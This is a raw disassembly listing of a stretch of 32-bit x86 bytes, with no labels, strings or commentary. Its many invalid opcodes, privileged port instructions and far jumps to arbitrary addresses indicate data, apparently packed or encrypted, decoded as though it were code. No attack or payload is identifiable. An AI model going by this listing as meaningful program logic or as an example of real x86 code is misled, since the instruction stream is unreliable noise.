  42bc46:	add    DWORD PTR [eax],eax
  42bc48:	cmc    
  42bc49:	add    BYTE PTR [eax],al
  42bc4b:	add    BYTE PTR [ebx+ebp*4],bl
  42bc4e:	repnz mov dl,0x56
  42bc51:	loopne 0x42bc64
  42bc53:	ror    DWORD PTR [eax-0x2a],0xab
  42bc57:	and    al,0xfe
  42bc59:	add    eax,0x40584a68
  42bc5e:	inc    edx
  42bc5f:	push   0xf1011afe
  42bc64:	jl     0x42bc5e
  42bc66:	push   es
  42bc67:	dec    ecx
  42bc68:	mul    BYTE PTR [esi+0x58]
  42bc6b:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42bc6d:	(bad)  
  42bc6e:	mov    ss,ebp
  42bc70:	push   0xffffff87
  42bc72:	push   ss
  42bc73:	mov    ds,WORD PTR [edx+edx*2+0xddd7766]
  42bc7a:	xchg   esp,eax
  42bc7b:	sbb    cl,bl
  42bc7d:	shl    DWORD PTR [ecx+0x66],1
  42bc80:	pop    esi
  42bc81:	(bad)  
  42bc82:	in     al,0x9f
  42bc84:	push   esi
  42bc85:	mov    esp,0x4d5fba7f
  42bc8a:	call   0x132e:0x138df7f1
  42bc91:	pusha  
  42bc92:	popf   
  42bc93:	jne    0x42bd13
  42bc95:	adc    DWORD PTR [esi-0x309d2076],edx
  42bc9b:	cld    
  42bc9c:	stos   BYTE PTR es:[edi],al
  42bc9d:	jb     0x42bccc
  42bc9f:	cld    
  42bca0:	add    eax,0x4401c0ee
  42bca5:	push   ss
  42bca6:	sahf   
  42bca7:	xchg   esi,eax
  42bca8:	mov    esi,0x807ee80e
  42bcad:	shl    edx,0xd2
  42bcb0:	dec    ecx
  42bcb1:	xor    esi,DWORD PTR [edx+esi*8-0x358f0cd6]
  42bcb8:	and    DWORD PTR [ecx+0x10],edi
  42bcbb:	mov    DWORD PTR [edi-0x4de284e9],0x37ad81d
  42bcc5:	fxch   st(1)
  42bcc7:	and    BYTE PTR [ebx],ch
  42bcc9:	mov    bh,0xab
  42bccb:	lods   al,BYTE PTR ds:[esi]
  42bccc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bccd:	hlt    
  42bcce:	pop    ebx
  42bccf:	sub    BYTE PTR [ebx+0x280924be],bh
  42bcd5:	test   al,0x5e
  42bcd7:	push   esi
  42bcd8:	sub    eax,0x730169de
  42bcdd:	cmp    dl,BYTE PTR [esi]
  42bcdf:	sti    
  42bce0:	les    esi,FWORD PTR [ebp+ebp*1-0x5e]
  42bce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bce5:	pop    ebp
  42bce6:	mov    ch,0x99
  42bce8:	bnd jae 0x42bd08
  42bceb:	mov    edi,0x5526125c
  42bcf0:	ds mov bh,0x41
  42bcf3:	jo     0x42bd61
  42bcf5:	push   esp
  42bcf6:	addr16 data16 ja 0x42bd40
  42bcfa:	mov    eax,ds:0x45dc7fc3
  42bcff:	in     eax,0x7c
  42bd01:	loop   0x42bcef
  42bd03:	jmp    0x6020:0xac15078b
  42bd0a:	or     al,0xfa
  42bd0c:	mov    eax,DWORD PTR [ebx]
  42bd0e:	and    DWORD PTR [ecx+0x7d],edi
  42bd11:	and    BYTE PTR [ecx-0x2c],al
  42bd14:	and    eax,0xf1f55e48
  42bd19:	ror    ecx,0xd8
  42bd1c:	dec    esi
  42bd1d:	push   esi
  42bd1e:	xchg   edi,eax
  42bd1f:	aas    
  42bd20:	add    BYTE PTR [ebx+0x5e],bh
  42bd23:	sub    esp,DWORD PTR [eax-0x58471897]
  42bd29:	dec    esp
  42bd2a:	mov    ds:0x7b728a17,al
  42bd2f:	std    
  42bd30:	loope  0x42bd22
  42bd32:	add    eax,0x3e6a0b45
  42bd37:	xchg   BYTE PTR [edx-0x3b],cl
  42bd3a:	stos   BYTE PTR es:[edi],al
  42bd3b:	sbb    BYTE PTR [edx-0x55],cl
  42bd3e:	daa    
  42bd3f:	aas    
  42bd40:	jge    0x42bd42
	...
  42bdb2:	add    BYTE PTR [eax],al
  42bdb4:	mov    edi,0x4a8e4af7
  42bdb9:	mov    edi,0x5143f7ff
  42bdbe:	jne    0x42bdcc
  42bdc0:	addr16 inc esp
  42bdc2:	mov    dh,0xbe
  42bdc4:	add    eax,0xf50001d0
  42bdc9:	add    BYTE PTR [eax],al
  42bdcb:	add    BYTE PTR [eax+0x23c7542d],cl
  42bdd1:	sbb    BYTE PTR [edi+ebx*4-0x61],bl
  42bdd5:	aad    0xe0
  42bdd7:	rcl    DWORD PTR [esi+0x5f],0x32
  42bddb:	mov    ebx,0xf75a84a8
  42bde0:	cwde   
  42bde1:	gs add ah,bl
  42bde4:	mov    al,0xfd
  42bde6:	cdq    
  42bde7:	sbb    ecx,DWORD PTR [ebp-0x76715d15]
  42bded:	push   0x5c0630c5
  42bdf2:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42bdf4:	bound  ebx,QWORD PTR [esi+edx*8-0x12]
  42bdf8:	xchg   ecx,eax
  42bdf9:	inc    edi
  42bdfa:	pusha  
  42bdfb:	les    eax,FWORD PTR [edx]
  42bdfd:	mov    dh,0x87
  42bdff:	into   
  42be00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be01:	add    BYTE PTR [ebx+0x33],ch
  42be04:	dec    ebp
  42be05:	(bad)  
  42be07:	push   esp
  42be08:	inc    eax
  42be09:	cmp    eax,0x585622fe
  42be0e:	lock cwde 
  42be10:	cmp    esp,edx
  42be12:	pop    ebx
  42be13:	mov    ebp,0xa2c9fc
  42be18:	icebp  
  42be19:	ret    
  42be1a:	stc    
  42be1b:	cmp    eax,0x20f1c924
  42be20:	retf   0xfbc6
  42be23:	inc    ebx
  42be24:	mov    esi,0xb9c226f7
  42be29:	push   ebx
  42be2a:	lods   eax,DWORD PTR ds:[esi]
  42be2b:	call   0x9821:0xfe70289f
  42be32:	jmp    0x65ad8178
  42be37:	in     al,0xda
  42be39:	ret    0xf6b4
  42be3c:	retf   0x5330
  42be3f:	sahf   
  42be40:	pop    ecx
  42be41:	mov    eax,0xd7336445
  42be46:	jp     0x42be68
  42be48:	les    ebx,FWORD PTR [esi-0x2614da4e]
  42be4e:	nop
  42be4f:	mov    BYTE PTR [ebx+esi*8+0x2b],dh
  42be53:	pop    edi
  42be54:	imul   ecx,DWORD PTR [edi+0x5a5cdc7f],0xb3cec322
  42be5e:	pop    edx
  42be5f:	jbe    0x42be5c
  42be61:	pushw  ds
  42be63:	leave  
  42be64:	xchg   BYTE PTR [edi+0x7be827a3],al
  42be6a:	(bad)  
  42be6b:	xlat   BYTE PTR ds:[ebx]
  42be6c:	stos   DWORD PTR es:[edi],eax
  42be6d:	xchg   edx,eax
  42be6e:	div    BYTE PTR [esp+eax*2-0x20]
  42be72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be73:	push   esi
  42be74:	sub    DWORD PTR [ebp-0x67912b3f],edi
  42be7a:	imul   ebp,DWORD PTR [edi+0x71],0x2c
  42be7e:	adc    eax,0xa87e33ab
  42be83:	mov    eax,ds:0x292b8409
  42be88:	push   esi
  42be89:	pop    ss
  42be8a:	sub    dl,dh
  42be8c:	mov    bl,BYTE PTR ss:[ebp-0x2]
  42be90:	add    BYTE PTR [eax-0x2be2615],dh
  42be96:	je     0x42be7f
  42be98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be99:	jbe    0x42be31
  42be9b:	and    eax,0xcd506a8d
  42bea0:	jle    0x42bef8
  42bea2:	rol    DWORD PTR [ebp-0x37b8b686],0xea
  42bea9:	push   0x7d
  42beab:	aad    0xa6
  42bead:	add    BYTE PTR [edi-0x8],cl
  42beb0:	add    DWORD PTR [ebp+0x75],0xffffffed
  42beb4:	ret    
  42beb5:	dec    edi
  42beb6:	call   0xca8e67c2
  42bebb:	xor    edi,DWORD PTR [eax-0x31]
  42bebe:	sbb    al,0x55
  42bec0:	retf   
	...
  42bf31:	add    BYTE PTR [eax],al
  42bf33:	add    cl,bh
  42bf35:	enter  0xdc7a,0x7b
  42bf39:	(bad)  
  42bf3a:	(bad)  
  42bf3b:	in     eax,dx
  42bf3c:	out    dx,al
  42bf3d:	mov    ah,0x3
  42bf3f:	dec    ecx
  42bf40:	jne    0x42beec
  42bf42:	(bad)  
  42bf43:	jg     0x42bf3f
  42bf45:	rol    BYTE PTR [ecx],1
  42bf47:	add    ch,dh
  42bf49:	add    BYTE PTR [eax],al
  42bf4b:	add    bl,dl
  42bf4d:	mov    bl,BYTE PTR [edx]
  42bf4f:	test   DWORD PTR [ebp-0x3],esp
  42bf52:	mov    bh,0x9b
  42bf54:	adc    BYTE PTR [eax],bl
  42bf56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bf57:	or     BYTE PTR [edi-0x346ecf1b],dl
  42bf5d:	cmp    BYTE PTR [eax],bh
  42bf5f:	xchg   edx,eax
  42bf60:	cld    
  42bf61:	mov    ch,0xfd
  42bf63:	add    al,0xf
  42bf65:	jae    0x42bfe6
  42bf67:	adc    dh,BYTE PTR [eax+0x49]
  42bf6a:	sbb    eax,0x67863b87
  42bf6f:	fild   DWORD PTR ds:0x45d09c1
  42bf75:	jp     0x42bef8
  42bf77:	loope  0x42bf1d
  42bf79:	shl    bl,0xcc
  42bf7c:	push   0xffffffb9
  42bf7e:	xor    DWORD PTR [ebp+ebp*8+0x73],0xffffffed
  42bf83:	test   BYTE PTR [esi],dl
  42bf85:	jp     0x42bf3c
  42bf87:	pop    ds
  42bf88:	fcmovnbe st,st(3)
  42bf8a:	js     0x42bf82
  42bf8c:	sbb    BYTE PTR ds:0xd8874719,0x36
  42bf93:	jae    0x42bf36
  42bf95:	pop    eax
  42bf96:	and    BYTE PTR [esi-0x49],dl
  42bf99:	mov    al,0x1d
  42bf9b:	inc    esp
  42bf9c:	out    dx,al
  42bf9d:	loopne 0x42bfe9
  42bf9f:	sub    al,BYTE PTR [eax+0x72]
  42bfa2:	retf   
  42bfa3:	add    BYTE PTR [edx+edx*2+0x71],cl
  42bfa7:	mov    BYTE PTR [eax+ebx*4+0x47],ah
  42bfab:	sahf   
  42bfac:	shl    DWORD PTR [edx],1
  42bfae:	es clc 
  42bfb0:	bswap  edi
  42bfb2:	adc    edi,DWORD PTR [ebx+0x4ffe8abf]
  42bfb8:	imul   BYTE PTR [ebp-0x5c]
  42bfbb:	pop    ds
  42bfbc:	jmp    0x9f7c7849
  42bfc1:	mov    ds:0xb6fbf685,eax
  42bfc6:	push   ebx
  42bfc7:	fst    DWORD PTR [ecx+edx*2]
  42bfca:	fmul   st,st(4)
  42bfcc:	adc    DWORD PTR [edi-0x78975737],0xffffffc9
  42bfd3:	push   es
  42bfd4:	adc    dl,BYTE PTR [eax+0x6f]
  42bfd7:	and    ch,dh
  42bfd9:	jmp    0x42bfbe
  42bfdb:	enter  0x75df,0x1b
  42bfdf:	jo     0x42bfe2
  42bfe1:	pop    esp
  42bfe2:	icebp  
  42bfe3:	repnz cld 
  42bfe5:	pushf  
  42bfe6:	mov    ds:0x99fd9c99,eax
  42bfeb:	jne    0x42bfc1
  42bfed:	fs int3 
  42bfef:	mov    edx,0x822228a2
  42bff4:	sbb    al,0x2e
  42bff6:	or     ecx,DWORD PTR [eax+0x562c9842]
  42bffc:	xor    ah,ah
  42bffe:	ja     0x42bff5
  42c000:	pop    ecx
  42c001:	add    dl,BYTE PTR [eax+0x6c73b0a3]
  42c007:	loope  0x42c07a
  42c009:	mov    WORD PTR [edx-0x78],es
  42c00c:	pusha  
  42c00d:	and    esp,DWORD PTR [ecx]
  42c00f:	adc    eax,0xe9b10231
  42c014:	push   ebx
  42c015:	cmc    
  42c016:	je     0x42c08c
  42c018:	add    DWORD PTR [eax-0x2b0195f5],edi
  42c01e:	fild   WORD PTR [eax+0x53]
  42c021:	ror    ah,1
  42c023:	jle    0x42c054
  42c025:	pop    esi
  42c026:	imul   eax,DWORD PTR [eax-0x1e7ba028],0x6e903dd8
  42c030:	jp     0x42c04a
  42c032:	push   ss
  42c033:	repnz xchg esi,eax
  42c035:	dec    eax
  42c036:	mov    ah,0x84
  42c038:	gs mov ecx,0xc7177df6
  42c03e:	inc    eax
  42c03f:	jle    0x42c087
	...
  42c0b1:	add    BYTE PTR [eax],al
  42c0b3:	add    BYTE PTR [ebp+0x25],dh
  42c0b6:	imul   ebx,DWORD PTR [edi-0x51]
  42c0ba:	cmc    
  42c0bb:	(bad)  
  42c0bc:	call   0xba942915
  42c0c1:	bound  ebp,QWORD PTR [ebp+0x59]
  42c0c4:	out    dx,eax
  42c0c5:	rol    DWORD PTR [ecx],1
  42c0c7:	add    ch,dh
  42c0c9:	add    BYTE PTR [eax],al
  42c0cb:	add    BYTE PTR [ecx],ah
  42c0cd:	cmp    DWORD PTR [edi],ebp
  42c0cf:	adc    bl,BYTE PTR [eax-0xd2be94c]
  42c0d5:	daa    
  42c0d6:	iret   
  42c0d7:	cmp    DWORD PTR [ebx],esi
  42c0d9:	pop    eax
  42c0da:	call   0x529b53e2
  42c0df:	sbb    eax,0x85326ea1
  42c0e4:	sbb    al,0x5c
  42c0e6:	xor    esp,DWORD PTR [ecx*8+0x18df0770]
  42c0ed:	adc    al,0x90
  42c0ef:	inc    esp
  42c0f0:	mov    ds:0x12fc6ac8,al
  42c0f5:	cmp    al,0x1a
  42c0f7:	xchg   esp,eax
  42c0f8:	dec    ecx
  42c0f9:	aam    0xcb
  42c0fb:	mov    al,0x7c
  42c0fd:	xor    DWORD PTR [eax],edi
  42c0ff:	cmp    bh,cl
  42c101:	das    
  42c102:	sub    DWORD PTR [ebx],edi
  42c104:	mov    ch,0xf5
  42c106:	fld    QWORD PTR [edx+0x69]
  42c109:	in     eax,0x1
  42c10b:	mov    dh,0x31
  42c10d:	ins    BYTE PTR es:[edi],dx
  42c10e:	imul   esp,esi,0xfffffffb
  42c111:	adc    DWORD PTR [edi+0x5a2eaa7b],0x316a5ab8
  42c11b:	gs (bad) 
  42c11d:	mov    ah,0x8f
  42c11f:	sub    DWORD PTR [edx],edi
  42c121:	push   edx
  42c122:	rol    DWORD PTR [ebx],cl
  42c124:	into   
  42c125:	jmp    0x6f83e42d
  42c12a:	add    edx,edi
  42c12c:	xchg   esp,eax
  42c12d:	fwait
  42c12e:	pshufw mm3,QWORD PTR [ecx+0x13],0x8d
  42c133:	ret    0x6636
  42c136:	lea    edi,[ebx+esi*2+0x711468a2]
  42c13d:	pop    ebx
  42c13e:	add    DWORD PTR [esi+0x4d],ebp
  42c141:	and    ah,BYTE PTR [edi-0x68699e65]
  42c147:	fsub   st,st(7)
  42c149:	cmp    BYTE PTR [esp+eiz*2+0x1f],0xb
  42c14e:	mov    ch,0x7b
  42c150:	or     eax,0xf029cb72
  42c155:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c157:	into   
  42c158:	stos   BYTE PTR es:[edi],al
  42c159:	ins    DWORD PTR es:[edi],dx
  42c15a:	ror    BYTE PTR [esi-0x60],cl
  42c15d:	cmp    eax,0xd890a39e
  42c162:	ds inc ebp
  42c164:	test   al,0x28
  42c166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c167:	fldenv [edx+0x4e]
  42c16a:	mov    ecx,0xb2d828cd
  42c16f:	push   0xffffffd6
  42c171:	cmp    al,bl
  42c173:	lahf   
  42c174:	shr    cl,0xd1
  42c177:	cli    
  42c178:	jnp    0x42c1b0
  42c17a:	dec    eax
  42c17b:	jno    0x42c195
  42c17d:	fwait
  42c17e:	out    dx,al
  42c17f:	ror    edx,1
  42c181:	pop    esp
  42c182:	in     eax,dx
  42c183:	dec    esp
  42c184:	cmp    eax,0xe0ac06e4
  42c189:	outs   dx,BYTE PTR ds:[esi]
  42c18a:	mov    bl,0x73
  42c18c:	das    
  42c18d:	ss xchg esp,eax
  42c18f:	add    DWORD PTR [ecx],0x68
  42c192:	cmp    cl,BYTE PTR [edx+0x58]
  42c195:	mov    edx,0x5e334b0b
  42c19a:	in     eax,0x66
  42c19c:	and    dh,BYTE PTR [edi+0x3f700a53]
  42c1a2:	cmp    al,0x12
  42c1a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c1a5:	jmp    0xaa21:0xb56fe449
  42c1ac:	cwde   
  42c1ad:	rcr    bh,cl
  42c1af:	int3   
  42c1b0:	dec    esp
  42c1b1:	lock icebp 
  42c1b3:	ins    DWORD PTR es:[edi],dx
  42c1b4:	sbb    bl,BYTE PTR [ebx]
  42c1b6:	add    DWORD PTR [ebx],ebp
  42c1b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c1b9:	(bad)  
  42c1ba:	shl    DWORD PTR [esp+ebp*8],1
  42c1bd:	cs mov ah,0x47
  42c1c0:	pop    edx
	...
  42c231:	add    BYTE PTR [eax],al
  42c233:	add    BYTE PTR [ebp-0x449f6672],ah
  42c239:	ja     0x42c238
  42c23b:	iret   
  42c23c:	xchg   esp,eax
  42c23d:	xor    edx,DWORD PTR [ecx+ebp*1-0x61]
  42c241:	sbb    BYTE PTR ss:0x1d2e4,dh
  42c248:	cmc    
  42c249:	add    BYTE PTR [eax],al
  42c24b:	add    BYTE PTR [ebx],bl
  42c24d:	inc    edi
  42c24e:	popa   
  42c24f:	sbb    DWORD PTR [ebx],0x67821d87
  42c255:	jp     0x42c206
  42c257:	ficomp WORD PTR [ebx+0x31]
  42c25a:	mov    ch,0x24
  42c25c:	inc    edi
  42c25d:	and    ah,dl
  42c25f:	lahf   
  42c260:	test   eax,0xc96134d4
  42c265:	stos   DWORD PTR es:[edi],eax
  42c266:	jns    0x42c2c6
  42c268:	and    ah,dh
  42c26a:	pushf  
  42c26b:	test   al,0xe3
  42c26d:	push   es
  42c26e:	lods   al,BYTE PTR ds:[esi]
  42c26f:	(bad)  
  42c270:	(bad)
  42c273:	xchg   ebp,eax
  42c274:	shl    BYTE PTR [esi+0xcdcee98],1
  42c27a:	xor    ecx,ebx
  42c27c:	push   ds
  42c27d:	mov    BYTE PTR [ebx+0x7e],dh
  42c280:	loope  0x42c229
  42c282:	adc    esp,edx
  42c284:	or     ch,BYTE PTR [ebp-0x64]
  42c287:	mov    ch,0xaf
  42c289:	add    DWORD PTR [eax+edi*1+0x29],ebx
  42c28d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c28e:	push   0xfdcb8042
  42c293:	mov    fs,WORD PTR [edx+0x3f2cba6b]
  42c299:	sbb    DWORD PTR [esi],esi
  42c29b:	fidivr DWORD PTR [ebx-0x43]
  42c29e:	pop    edx
  42c29f:	mov    cl,0x19
  42c2a1:	mov    bl,0xdc
  42c2a3:	inc    ecx
  42c2a4:	jmp    0x7cb9049
  42c2a9:	push   ecx
  42c2aa:	or     BYTE PTR [eax-0x3423b8cc],bl
  42c2b0:	add    al,0x4f
  42c2b2:	dec    edx
  42c2b3:	sub    eax,0xa8bd8172
  42c2b8:	imul   BYTE PTR [ecx]
  42c2ba:	jmp    0xbe222e83
  42c2bf:	jb     0x42c248
  42c2c1:	mov    eax,0x37f48953
  42c2c6:	xor    al,BYTE PTR [esi+0x110419b9]
  42c2cc:	push   cs
  42c2cd:	dec    esp
  42c2ce:	cdq    
  42c2cf:	es dec eax
  42c2d1:	push   ebx
  42c2d2:	scas   eax,DWORD PTR es:[edi]
  42c2d3:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c2d5:	imul   ebx,DWORD PTR [eax],0x902d227a
  42c2db:	xchg   ebp,eax
  42c2dc:	jl     0x42c338
  42c2de:	je     0x42c2f7
  42c2e0:	xchg   ebp,eax
  42c2e1:	out    dx,al
  42c2e2:	dec    eax
  42c2e3:	(bad)  
  42c2e4:	xchg   ebp,eax
  42c2e5:	lea    esi,[eax+eiz*1-0x61]
  42c2e9:	and    esi,esi
  42c2eb:	daa    
  42c2ec:	std    
  42c2ed:	and    DWORD PTR [ebp+0x12aeeae0],ebx
  42c2f3:	mov    eax,0x92364be4
  42c2f8:	aaa    
  42c2f9:	aad    0xc2
  42c2fb:	das    
  42c2fc:	jb     0x42c2e5
  42c2fe:	clc    
  42c2ff:	jp     0x42c36e
  42c301:	pop    ss
  42c302:	lock or BYTE PTR [esi+0x58],ah
  42c306:	ja     0x42c32a
  42c308:	xchg   DWORD PTR [edx-0x75f9c35c],edi
  42c30e:	test   DWORD PTR [ebp-0x54],ebx
  42c311:	es pop ds
  42c313:	add    DWORD PTR [ecx+0x14a126b7],esp
  42c319:	out    dx,eax
  42c31a:	addr16 add eax,esp
  42c31d:	rcr    BYTE PTR [edx],cl
  42c31f:	js     0x42c2a1
  42c321:	cs sbb cl,0x89
  42c325:	pop    ecx
  42c326:	pop    ss
  42c327:	loop   0x42c378
  42c329:	fist   WORD PTR [edi-0x69539a83]
  42c32f:	jo     0x42c387
  42c331:	repnz int 0x2e
  42c334:	call   0xfeb8:0x4cd7b390
  42c33b:	int3   
  42c33c:	inc    ebp
  42c33d:	arpl   WORD PTR [esi+0x3729],ax
	...
  42c3b3:	add    BYTE PTR [edx-0x1011dfbb],cl
  42c3b9:	out    dx,eax
  42c3ba:	into   
  42c3bb:	gs aam 0xa
  42c3be:	fst    DWORD PTR [ecx-0x16]
  42c3c1:	imul   esi,DWORD PTR [esi],0x6c
  42c3c4:	(bad)  
  42c3c6:	add    DWORD PTR [eax],eax
  42c3c8:	cmc    
  42c3c9:	add    BYTE PTR [eax],al
  42c3cb:	add    ch,dl
  42c3cd:	shr    DWORD PTR [ecx-0x10d4872a],0x37
  42c3d4:	and    al,0x93
  42c3d6:	jno    0x42c36e
  42c3d8:	sub    dl,BYTE PTR [ecx]
  42c3da:	in     eax,dx
  42c3db:	fdiv   DWORD PTR [esi+0x6b5874c0]
  42c3e1:	jl     0x42c3e3
  42c3e3:	mov    ds:0x5d9ee4e,eax
  42c3e8:	imul   ebx,DWORD PTR [ebx-0x28da39d0],0xfffffff9
  42c3ef:	push   edi
  42c3f0:	or     ecx,DWORD PTR [esi+0x3b15a97f]
  42c3f6:	hlt    
  42c3f7:	xchg   esi,eax
  42c3f8:	sbb    BYTE PTR [edi],cl
  42c3fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c3fb:	pop    esp
  42c3fc:	pop    eax
  42c3fd:	mov    ch,0xa6
  42c3ff:	mov    cl,0xb4
  42c401:	bound  edx,QWORD PTR [esi]
  42c403:	mov    eax,0x89849521
  42c408:	idiv   bl
  42c40a:	sbb    DWORD PTR [esp+eiz*4],edi
  42c40d:	jmp    0x42c43b
  42c40f:	cdq    
  42c410:	stos   DWORD PTR es:[edi],eax
  42c411:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c412:	pop    ds
  42c413:	lock adc edi,DWORD PTR [edx+0x42db35b2]
  42c41a:	mov    ah,0x11
  42c41c:	inc    esi
  42c41d:	xchg   edx,eax
  42c41e:	imul   edi,DWORD PTR [ebx-0x457b4ff3],0x7c22a274
  42c428:	out    dx,eax
  42c429:	std    
  42c42a:	jecxz  0x42c454
  42c42c:	xchg   edx,eax
  42c42d:	retf   
  42c42e:	xor    DWORD PTR [edx-0x5c2002d3],edx
  42c434:	inc    eax
  42c435:	retf   
  42c436:	dec    edi
  42c437:	jns    0x42c3f7
  42c439:	dec    edi
  42c43a:	adc    esi,esi
  42c43c:	sub    al,0xf1
  42c43e:	push   ecx
  42c43f:	or     eax,0xa6ea0a21
  42c444:	fiadd  WORD PTR [edi-0x44]
  42c447:	daa    
  42c448:	adc    eax,edi
  42c44a:	jne    0x42c4bb
  42c44c:	stos   BYTE PTR es:[edi],al
  42c44d:	xchg   DWORD PTR [esi],esp
  42c44f:	xchg   DWORD PTR [ebx],ecx
  42c451:	cmovno ebx,DWORD PTR ds:0x49b4ec52
  42c458:	jo     0x42c440
  42c45a:	adc    ch,bh
  42c45c:	push   ebx
  42c45d:	sub    DWORD PTR [esi],eax
  42c45f:	adc    al,0xef
  42c461:	aaa    
  42c462:	push   esp
  42c463:	mov    edi,?
  42c465:	xchg   ebp,edx
  42c467:	arpl   WORD PTR [edi],si
  42c469:	xor    BYTE PTR [eax+esi*8],bh
  42c46c:	jmp    0x27f6:0x375767ac
  42c473:	mov    edx,esi
  42c475:	push   cs
  42c476:	mov    ds:0x23388dce,eax
  42c47b:	add    esi,DWORD PTR [esi-0x36]
  42c47e:	fisttp QWORD PTR [eax+0x3c42ab17]
  42c484:	xor    BYTE PTR [eax+eiz*2],ah
  42c487:	dec    ecx
  42c488:	and    ebp,DWORD PTR [edx+edi*4]
  42c48b:	jg     0x42c465
  42c48d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c48e:	dec    ecx
  42c48f:	cdq    
  42c490:	(bad)  
  42c491:	mov    al,ds:0xa4a27efe
  42c496:	icebp  
  42c497:	inc    esp
  42c498:	pop    ds
  42c499:	enter  0x78c3,0x5f
  42c49d:	int    0xd
  42c49f:	mov    ch,0x6f
  42c4a1:	mov    ebp,0x7ce8d71e
  42c4a6:	xor    al,0x1a
  42c4a8:	jo     0x42c49d
  42c4aa:	xchg   esp,eax
  42c4ab:	popf   
  42c4ac:	jle    0x42c4e4
  42c4ae:	out    0x80,eax
  42c4b0:	frstor [ebx+esi*1]
  42c4b3:	pop    esp
  42c4b4:	xchg   BYTE PTR [ecx+0x7d],bh
  42c4b7:	sub    al,ah
  42c4b9:	xor    eax,0x13a17272
  42c4be:	ins    BYTE PTR es:[edi],dx
  42c4bf:	and    ch,BYTE PTR [esi+0x0]
	...
  42c531:	add    BYTE PTR [eax],al
  42c533:	add    al,ah
  42c535:	xchg   esp,eax
  42c536:	and    bh,cl
  42c538:	je     0x42c539
  42c53a:	out    dx,eax
  42c53b:	mov    edi,0x9a7cd6c5
  42c540:	sub    dh,BYTE PTR [ecx-0x2b314e31]
  42c546:	add    DWORD PTR [eax],eax
  42c548:	cmc    
  42c549:	add    BYTE PTR [eax],al
  42c54b:	add    BYTE PTR [esp+edx*4-0x6553b2b],ch
  42c552:	fld    DWORD PTR [esi-0x368fe38a]
  42c558:	jmp    0x42c559
  42c55a:	into   
  42c55b:	and    ah,dh
  42c55d:	jo     0x42c597
  42c55f:	pushf  
  42c560:	mov    al,ds:0xedb64f49
  42c565:	loope  0x42c527
  42c567:	js     0x42c54f
  42c569:	and    bh,dh
  42c56b:	xchg   ecx,eax
  42c56c:	jnp    0x42c58e
  42c56e:	mov    ds:0xe0060f3,eax
  42c573:	jg     0x42c5db
  42c575:	xchg   ecx,eax
  42c576:	loope  0x42c59c
  42c578:	mov    esp,0x250d3967
  42c57d:	pop    ds
  42c57e:	bound  esp,QWORD PTR [edi]
  42c580:	shl    BYTE PTR [ebp-0x18],cl
  42c583:	and    eax,0xd5b4bc34
  42c588:	dec    ecx
  42c589:	lea    esi,[ebp+0x55]
  42c58c:	jae    0x42c595
  42c58e:	ins    DWORD PTR es:[edi],dx
  42c58f:	or     al,0x38
  42c591:	sbb    al,0x57
  42c593:	mov    ch,0x13
  42c595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c596:	inc    ebp
  42c597:	test   eax,0xf9e08d50
  42c59c:	sub    DWORD PTR [ecx-0x76dc26f9],ecx
  42c5a2:	push   esp
  42c5a3:	and    al,0xfc
  42c5a5:	hlt    
  42c5a6:	std    
  42c5a7:	xor    al,0xcc
  42c5a9:	push   0x10
  42c5ab:	jge    0x42c531
  42c5ad:	out    0x29,al
  42c5af:	dec    ebp
  42c5b0:	std    
  42c5b1:	ror    DWORD PTR [ebx+edx*1],cl
  42c5b4:	push   edi
  42c5b5:	imul   edx,DWORD PTR ds:0xac4b7c89,0xffffffff
  42c5bc:	sbb    al,0x49
  42c5be:	cmp    ebp,ecx
  42c5c0:	mov    al,0xdd
  42c5c2:	aaa    
  42c5c3:	leave  
  42c5c4:	rcr    ah,1
  42c5c6:	xor    eax,0x422d2908
  42c5cb:	pop    ebx
  42c5cc:	or     ecx,DWORD PTR [ebx-0x5a]
  42c5cf:	lea    edx,[edi-0x3e]
  42c5d2:	mov    ds:0x36766fe7,eax
  42c5d7:	loop   0x42c5a7
  42c5d9:	out    0x1,eax
  42c5db:	push   es
  42c5dc:	pop    eax
  42c5dd:	mov    edi,0x9ce006fc
  42c5e2:	mov    DWORD PTR [edi-0x2d],edx
  42c5e5:	enter  0xc135,0x6f
  42c5e9:	jge    0x42c62b
  42c5eb:	mov    bh,0xa7
  42c5ed:	mov    ecx,DWORD PTR [edx-0xd]
  42c5f0:	jno    0x42c5c4
  42c5f2:	fistp  DWORD PTR [ebp+0x6e]
  42c5f5:	in     al,0xc9
  42c5f7:	xchg   edi,eax
  42c5f8:	pop    edx
  42c5f9:	ret    
  42c5fa:	cs jbe 0x42c5a0
  42c5fd:	mov    ch,0xc9
  42c5ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c600:	xchg   ecx,eax
  42c601:	(bad)  
  42c602:	lock hlt 
  42c604:	mov    dl,0x7
  42c606:	mov    eax,esp
  42c608:	mov    ch,0x89
  42c60a:	jmp    0x2bd3a41
  42c60f:	and    al,0x64
  42c611:	pop    ss
  42c612:	and    edx,eax
  42c614:	pop    esi
  42c615:	or     eax,0xa5bdc056
  42c61a:	outs   dx,BYTE PTR ds:[esi]
  42c61b:	mov    fs,WORD PTR [esi+eiz*8+0x7a]
  42c61f:	fs fs mov edi,0xcc135f95
  42c626:	jns    0x42c67c
  42c628:	xchg   edi,eax
  42c629:	fnsave ds:0xc11b6f24
  42c62f:	push   ebx
  42c630:	xchg   edx,eax
  42c631:	and    edi,esi
  42c633:	in     al,0x4
  42c635:	jmp    0x42c64c
  42c637:	xor    al,0xb2
  42c639:	popa   
  42c63a:	inc    ebp
